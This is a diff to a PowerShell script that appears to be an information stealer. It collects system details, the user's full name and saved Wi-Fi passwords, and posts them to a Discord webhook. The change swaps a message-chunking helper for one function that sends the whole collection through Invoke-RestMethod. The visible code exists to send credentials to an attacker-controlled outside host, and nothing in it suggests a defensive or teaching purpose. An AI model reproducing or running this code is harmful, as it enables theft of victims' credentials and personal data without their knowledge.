@@ -400,39 +400,23 @@ vault -ErrorAction SilentlyContinue -Force
 # Debug: Output the length of SystemInfo
 Write-Host "Length of SystemInfo: $($SystemInfo.Length)"
 
-#Split for Discord
-function Send-SplitToDiscord {
+function Send-ToDiscord {
     param ($Message)
 
-    # Set the maximum message length
-    $maxLength = 1900
+    # Debug: Output the message length and first 100 characters
+    Write-Host "Send-ToDiscord called with message length: $($Message.Length)"
+    Write-Host "Message content (first 100 characters): $($Message.Substring(0, [Math]::Min(100, $Message.Length)))"
 
-    # Debug: Log the length of the incoming message
-    Write-Host "Send-SplitToDiscord called with message length: $($Message.Length)"
+    $payload = '{"content": "```' + $Message + '```"}'
 
-    # While the message length exceeds the max length, send it in chunks
-    while ($Message.Length -gt $maxLength) {
-        # Extract the first chunk of the message
-        $chunk = $Message.Substring(0, $maxLength)
-
-        # Debug: Log the chunk length and content
-        Write-Host "Sending chunk with length: $($chunk.Length)"
-        Write-Host "Chunk content (first 100 characters): $($chunk.Substring(0, [Math]::Min(100, $chunk.Length)))"
-
-        # Send the chunk to Discord
-        Send-ToDiscord -Message $chunk
-
-        # Remove the sent chunk from the original message
-        $Message = $Message.Substring($maxLength)
-    }
-
-    # Send any remaining part of the message
-    if ($Message.Length -gt 0) {
-        Write-Host "Sending final part with length: $($Message.Length)"
-        Send-ToDiscord -Message $Message
+    try {
+        Invoke-RestMethod -Uri $DiscordWebhookUrl -Method Post -ContentType "application/json" -Body $payload
+        Write-Host "Data sent to Discord successfully."
+    } catch {
+        Write-Error "Failed to send data to Discord."
+        Write-Error $_.Exception.Message
     }
 }
-
 
 # Main Script: Gather System Information
 $FullName = Get-FullName
@@ -461,7 +445,9 @@ $WiFiPasswords
 "@
 
 # Send the Full System Info to Discord, Handling Long Messages
-Send-SplitToDiscord -Message $SystemInfo
+Write-Host "Sending System Info directly to Discord."
+Send-ToDiscord -Message $SystemInfo
+
 
 ############################################################################################################################################################
 
